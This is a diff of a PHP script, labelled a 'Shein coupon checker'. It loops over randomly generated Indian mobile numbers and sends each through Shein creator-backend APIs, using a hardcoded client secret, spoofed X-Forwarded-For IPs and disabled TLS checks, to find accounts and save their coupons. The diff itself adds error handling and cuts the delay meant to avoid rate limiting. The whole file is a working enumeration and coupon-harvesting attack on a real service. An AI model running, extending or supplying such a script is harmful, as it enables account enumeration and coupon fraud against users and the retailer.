@@ -2,53 +2,55 @@
 // File to save valid coupons
 $validFile = getenv('USERPROFILE') . '/Desktop/Downloads/shein_valid.txt';
 
-function httpCall($url, $data = null, $headers = [], $method = "GET", $returnHeaders = false, $proxy = false, $ip = null, $auth = null) {
-    if (empty($headers)) {
-        $ip = long2ip(mt_rand());
-        $headers = [
-            "X-Forwarded-For: $ip",
-            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
-        ];
-    }
-    
+// Check if cURL is available
+if (!function_exists('curl_init')) {
+    die("❌ ERROR: cURL extension is not enabled!\n\nTo fix this:\n1. Open php.ini file\n2. Find: ;extension=curl\n3. Remove the semicolon: extension=curl\n4. Save and restart\n");
+}
+
+function httpCall($url, $data = null, $headers = [], $method = "GET", $returnHeaders = false) {
     $ch = curl_init();
-    curl_setopt_array($ch, [
-        CURLOPT_URL => $url,
-        CURLOPT_HTTPHEADER => $headers,
-        CURLOPT_SSL_VERIFYPEER => false,
-        CURLOPT_SSL_VERIFYHOST => false,
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_HEADER => $returnHeaders,
-        CURLOPT_ENCODING => 'gzip',
-        CURLOPT_FOLLOWLOCATION => true,
-        CURLOPT_CONNECTTIMEOUT => 5,
-        CURLOPT_TIMEOUT => 10
-    ]);
     
-    if ($proxy) {
-        curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
-        curl_setopt($ch, CURLOPT_PROXY, $ip);
-        if ($auth) {
-            curl_setopt($ch, CURLOPT_PROXYUSERPWD, $auth);
-        }
+    // Basic curl options
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
+    
+    // Add headers
+    if (!empty($headers)) {
+        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+    } else {
+        // Default headers
+        $ip = randIp();
+        curl_setopt($ch, CURLOPT_HTTPHEADER, [
+            "X-Forwarded-For: $ip",
+            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+        ]);
     }
     
+    // Handle POST request
     if (strtoupper($method) === "POST") {
         curl_setopt($ch, CURLOPT_POST, true);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-    } else {
         if ($data) {
-            $url .= "?" . http_build_query($data);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
         }
+    } elseif ($data && strtoupper($method) === "GET") {
+        // For GET with data, append to URL
+        $url .= (strpos($url, '?') === false ? '?' : '&') . http_build_query($data);
+        curl_setopt($ch, CURLOPT_URL, $url);
     }
     
     $output = curl_exec($ch);
     curl_close($ch);
+    
     return $output;
 }
 
 function randIp() { 
-    return rand(100,200).".".rand(10,250).".".rand(10,250).".".rand(1,250); 
+    return rand(100,200) . "." . rand(10,250) . "." . rand(10,250) . "." . rand(1,250); 
 }
 
 function genDeviceId() { 
@@ -56,9 +58,8 @@ function genDeviceId() {
 }
 
 function generateIndianNumber() {
-    // Generate numbers starting with 8 or 9 only (Indian mobile numbers)
-    $prefixes = ['8', '9'];
-    $prefix = $prefixes[array_rand($prefixes)];
+    // Generate numbers starting with 8 or 9 only
+    $prefix = (rand(0, 1) == 0) ? '8' : '9';
     
     // Generate remaining 9 digits
     $number = $prefix;
@@ -95,7 +96,13 @@ function checkNumber($number, &$triedNumbers) {
     ];
     
     $data = "grantType=client_credentials&clientName=trusted_client&clientSecret=secret";
-    $res = httpCall($url, $data, $headers, "POST", 0);
+    $res = httpCall($url, $data, $headers, "POST");
+    
+    if (empty($res)) {
+        echo "Error: Empty response from token API\n";
+        return false;
+    }
+    
     $j = json_decode($res, true);
     $access_token = $j['access_token'] ?? null;
     
@@ -121,7 +128,13 @@ function checkNumber($number, &$triedNumbers) {
     ];
     
     $data = "mobileNumber=$number";
-    $res = httpCall($url, $data, $headers, "POST", 0);
+    $res = httpCall($url, $data, $headers, "POST");
+    
+    if (empty($res)) {
+        echo "Error: Empty response from account check\n";
+        return false;
+    }
+    
     $j = json_decode($res, true);
     
     if(isset($j['success']) && $j['success'] === false) {
@@ -158,7 +171,13 @@ function checkNumber($number, &$triedNumbers) {
     ];
     
     $url = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/auth/generate-token";
-    $res = httpCall($url, $payload, $headers, "POST", 0);
+    $res = httpCall($url, $payload, $headers, "POST");
+    
+    if (empty($res)) {
+        echo "Error: Empty response from token generation\n";
+        return false;
+    }
+    
     $j = json_decode($res, true);
     
     if(empty($j['access_token'])) {
@@ -182,7 +201,13 @@ function checkNumber($number, &$triedNumbers) {
         "X-Forwarded-For: $ip"
     ];
     
-    $res = httpCall($url, "", $headers, "GET", 0);
+    $res = httpCall($url, "", $headers, "GET");
+    
+    if (empty($res)) {
+        echo "Error: Empty response from user API\n";
+        return false;
+    }
+    
     $decoded = json_decode($res, true);
     
     if (!isset($decoded['user_data']['instagram_data']['username'])) {
@@ -226,12 +251,32 @@ function checkNumber($number, &$triedNumbers) {
 }
 
 // Main script
+function clearScreen() {
+    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
+        system('cls');
+    } else {
+        system('clear');
+    }
+}
+
+// Check if cURL is available
+if (!function_exists('curl_version')) {
+    die("❌ cURL extension is not enabled in PHP!\n\nPlease enable it in php.ini:\n1. Open php.ini\n2. Remove semicolon from: ;extension=curl\n3. Save and restart\n");
+}
+
+clearScreen();
 echo "========================================\n";
 echo "SHEIN COUPON CHECKER - FASTEST VERSION\n";
 echo "========================================\n\n";
 echo "Auto-generating Indian numbers (8 or 9 starting)\n";
 echo "Saving valid coupons to: $validFile\n";
 echo "Press Ctrl+C to stop\n\n";
+
+// Create directory if it doesn't exist
+$dir = dirname($validFile);
+if (!is_dir($dir)) {
+    mkdir($dir, 0777, true);
+}
 
 // Array to track tried numbers
 $triedNumbers = [];
@@ -251,7 +296,7 @@ while (true) {
     }
     
     // Display the batch
-    echo "\n📱 Checking Batch: " . implode(" ", $numbers) . "\n";
+    echo "📱 Checking Batch: " . implode(" ", $numbers) . "\n";
     echo str_repeat("-", 50) . "\n";
     
     // Check each number
@@ -265,19 +310,18 @@ while (true) {
         }
         
         // Small delay to avoid rate limiting
-        usleep(500000); // 0.5 seconds
+        usleep(300000); // 0.3 seconds
     }
     
     echo "\n" . str_repeat("=", 50) . "\n";
     echo "📊 Stats: Checked: $checkedCount | Found: $foundCount\n";
     echo str_repeat("=", 50) . "\n\n";
     
-    // Clear previous batch display (simulate deletion of previous messages)
-    if (PHP_OS_FAMILY === 'Windows') {
-        system('cls');
-    } else {
-        system('clear');
-    }
+    // Wait 2 seconds before next batch
+    sleep(2);
+    
+    // Clear screen for next batch
+    clearScreen();
     
     // Re-display header
     echo "========================================\n";
